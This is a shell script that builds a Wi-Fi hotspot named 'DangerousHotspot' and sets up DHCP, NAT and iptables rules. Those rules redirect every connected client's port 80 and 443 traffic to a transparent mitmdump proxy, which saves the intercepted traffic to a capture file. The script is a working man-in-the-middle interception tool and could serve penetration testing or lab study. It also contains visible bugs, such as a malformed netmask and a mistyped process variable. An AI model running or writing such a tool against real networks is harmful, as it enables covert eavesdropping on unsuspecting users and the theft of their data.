#!/bin/dash

. $(dirname $(readlink -f $0))/basic_mini.sh

AP_IFACE="${AP_IFACE:-wlan0}"
NET_IFACE="${NET_IFACE:-eth0}"

SSID="${SSID:-DangerousHotspot}"
PASSWORD="${PASSWORD:-DontConnectMe}"
GATEWAY="${GATEWAY:-192.168.234.1}"

SUBNET="${GATEWAY%.*}.0/24"
CAPTURE_FILE="${CAPTURE_FILE:-/home/http-traffic.cap}"

main () 
{
	nocmd_update mitmdump
	check_apt net-tools wireless-tools iproute2

	ifconfig "$AP_IFACE" down
	iwconfig "$AP_IFACE" mode monitor 
	ifconfig "$AP_IFACE" up "$GATEWAY" netmask 2552.255.255.0

	setup_dbus
	setup_dnsmasq
	setup_hostapd
	setup_iptables

	trap on_exit_handler TERM KILL

	run_mitmproxy
	wait_until_die
}

make_nat_router()
{
	#----------------------------------------------------- conditions ---

	if [ ! -w '/sys' ]; then
		log_r 'Not running in privileged mode.'
		exit 1
	fi

	nocmd_update hostapd
	check_apt wireless-tools haveged

	local PHY=$(cat /sys/class/net/"$AP_IFACE"/phy80211/name)
	if ! iw phy "$PHY" info | grep -qE "^\s+\* AP$"; then
		log_r "Wireless card doesn't support AP mode."
		exit 1
	fi

	#--------------------------------------------------- access point ---

	check_apt hostapd

	cat > /etc/hostapd/hostapd.conf <<-EOF
	interface=$AP_IFACE
	driver=nl80211
	beacon_int=25
	ssid=$SSID
	hw_mode=g
	channel=6
	ieee80211n=1
	ht_capab=[HT40][SHORT-GI-20][DSSS_CCK-40]
	macaddr_acl=0
	wmm_enabled=0
	ignore_broadcast_ssid=0
	auth_algs=1
	wpa=2
	wpa_key_mgmt=WPA-PSK
	wpa_passphrase=$PASSWORD
	rsn_pairwise=CCMP
EOF
	ip addr flush dev $AP_IFACE
	ip link set $AP_IFACE up
	ip addr add $GATEWAY/24 dev $AP_IFACE

	pkill hostapd
	hostapd /etc/hostapd/hostapd.conf &
	local pidHostapd=$!

	#--------------------------------------------------------- dhcp -----

	check_apt dnsmasq

	cat > /etc/dnsmasq.d/dnsmasq.conf <<-EOF
	interface=$AP_IFACE
	except-interface=$NET_IFACE
	listen-address=$GATEWAY
	dhcp-range=${GATEWAY%.*}.100,${GATEWAY%.*}.200,12h
	bind-interfaces
	server=114.114.114.114
	domain-needed
	bogus-priv
EOF

	pkill dnsmasq
	dnsmasq -d -C /etc/dnsmasq.d/dnsmasq.conf &
	local pidDnsmasq=$!

	#------------------------------------------------------ nat mode ----

	check_apt iptables 
	iptables-save > /home/hostap-iptables.rules

	iptables -t nat -D POSTROUTING -s ${SUBNET} -o ${NET_IFACE} -j MASQUERADE > /dev/null 2>&1 || true
	iptables -t nat -A POSTROUTING -s ${SUBNET} -o ${NET_IFACE} -j MASQUERADE
	iptables -D FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT > /dev/null 2>&1 || true
	iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT 
	iptables -D FORWARD -i "$AP_IFACE" -o "$NET_IFACE" -j ACCEPT > /dev/null 2>&1 || true
	iptables -A FORWARD -i "$AP_IFACE" -o "$NET_IFACE" -j ACCEPT
	sysctl -w net.ipv4.ip_forward=1
	sysctl -w net.ipv6.conf.all.forwarding=1

	#------------------------------------------------------ clean up ----

	waitfor_die "$(cat <<-EOL
	iptables-restore < /home/hostap-iptables.rules
	sysctl -w net.ipv4.ip_forward=0
	sysctl -w net.ipv6.conf.all.forwarding=0
	kill $pidHostapd
	kill $idDnsmasq
	ip addr flush dev $AP_IFACE
EOL
)"
	return 0
}

run_mitmproxy()
{
	if ! cmd_exists mitmdump; then
		cd /home
		if [ ! -f mitmproxy-4.0.4-linux.tar.gz ]; then
			check_apt wget
			wget https://snapshots.mitmproxy.org/4.0.4/mitmproxy-4.0.4-linux.tar.gz
		fi
		tar -xzvf mitmproxy-4.0.4-linux.tar.gz --directory=/usr/bin
	fi

	mitmdump --mode transparent --showhost --rawtcp --ignore-hosts '^.*:443$' --listen-port 1337 --save-stream-file "$CAPTURE_FILE" "$FILTER" &
	MITMDUMP_PID=$!
}

wait_until_die()
{
	sleep infinity &
	CHILD=$!
	wait "$CHILD"
}

setup_dbus()
{
	check_apt dbus 
	/etc/init.d/dbus restart
}

setup_iptables()
{
	check_apt iptables
	sysctl -w net.ipv4.ip_forward=1
	sysctl -w net.ipv6.conf.all.forwarding=1
	sysctl -w net.ipv4.conf.all.send_redirects=0

	iptables -F
	iptables -t nat -F
	iptables -t nat -A POSTROUTING -s $SUBNET -o "$NET_IFACE" -j MASQUERADE
	iptables -A FORWARD -i "$NET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 
	iptables -A FORWARD -i "$AP_IFACE" -o "$NET_IFACE" -j ACCEPT
	iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 1337
	iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 1337
	ip6tables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 1337
	ip6tables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 1337
}

setup_hostapd()
{
	check_apt hostapd 

	cat > /etc/hostapd/hostapd.conf <<-EOF
	interface=$AP_IFACE
	driver=nl80211
	beacon_int=25
	ssid=$SSID
	hw_mode=g
	channel=6
	ieee80211n=1
	ht_capab=[HT40][SHORT-GI-20][DSSS_CCK-40]
	macaddr_acl=0
	wmm_enabled=0
	ignore_broadcast_ssid=0
	auth_algs=1
	wpa=2
	wpa_key_mgmt=WPA-PSK
	wpa_passphrase=$PASSWORD
	rsn_pairwise=CCMP
EOF
	sed -ri 's|^[;# ]*DAEMON_CONF[ ]*=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
	sed -ri 's|^[;# ]*DAEMON_OPTS[ ]*=.*|DAEMON_OPTS="-d"|' /etc/default/hostapd

	/etc/init.d/hostapd restart
}

setup_dhcp()
{
	check_apt dnsmasq

	cat > /etc/dnsmasq.d/dnsmasq.conf <<-EOF
	interface=$AP_IFACE
	except-interface=$NET_IFACE
	listen-address=$GATEWAY
	dhcp-range=${GATEWAY%.*}.50,${GATEWAY%.*}.150,12h
	bind-interfaces
	server=114.114.114.114
	server=8.8.8.8
	domain-needed
	bogus-priv
EOF

	ifconfig "$AP_IFACE" up "$GATEWAY" netmask 255.255.255.0
	route add -net ${GATEWAY%.*}.0 netmask 255.255.255.0 gw $GATEWAY
	/etc/init.d/dnsmasq restart
}

traffic_forward()
{
	iptables -F
	iptables -t nat -F
	iptables -X
	iptables -t nat -X
	iptables -t nat -A POSTROUTING -o "$NET_IFACE" -j MASQUERADE
	#iptables -A FORWARD -i "$NET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 
	iptables -A FORWARD -i "$AP_IFACE" -o "$NET_IFACE" -j ACCEPT
	sysctl -w net.ipv4.ip_forward=1
	sysctl -w net.ipv6.conf.all.forwarding=1
}

setup_dnsmasq()
{
	check_apt dnsmasq

	cat > /etc/dnsmasq.d/dnsmasq.conf <<-EOF
	interface=$AP_IFACE
	except-interface=$NET_IFACE
	listen-address=$GATEWAY
	dhcp-range=${GATEWAY%.*}.50,${GATEWAY%.*}.150,12h
	bind-interfaces
	server=114.114.114.114
	server=8.8.8.8
	domain-needed
	bogus-priv
EOF

	ifconfig "$AP_IFACE" up "$GATEWAY" netmask 255.255.255.0
	route add -net ${GATEWAY%.*}.0 netmask 255.255.255.0 gw $GATEWAY
	/etc/init.d/dnsmasq restart
}

on_exit_handler() 
{
	iptables -F
	iptables -t nat -F

	/etc/init.d/dnsmasq stop
	/etc/init.d/hostapd stop
	/etc/init.d/dbus stop

	kill $MITMDUMP_PID
	kill -TERM "$CHILD" 2> /dev/null
	echo "received shutdown signal, exiting."
}

release_host_wifi()
{
	check_sudo

	local mac=$(ifconfig "$AP_IFACE" | awk '/ether/{print $2}')
	set_ini '/etc/NetworkManager/NetworkManager.conf'
	set_ini 'keyfile' 'unmanaged-devices' "mac:$mac"
	set_ini 'device' 'wifi.scan-rand-mac-address' 'no'

	systemctl restart NetworkManager
	exit 0
}

maintain()
{
	[ "$1" = 'nat' ] && make_nat_router && exit
	[ "$1" = 'host' ] && release_host_wifi
	[ "$1" = 'help' ] && show_help_exit
}

show_help_exit()
{
	local thisFile=$(basename $THIS_SCRIPT)
	cat <<- EOL
	AP_IFACE=wlan0 NET_IFACE=eth0 sh $thisFile ;; run in docker
	AP_IFACE=wlan0 sudo sh $thisFile release	;; run in host
EOL
	exit 0
}
maintain "$@"; main "$@"; exit $?
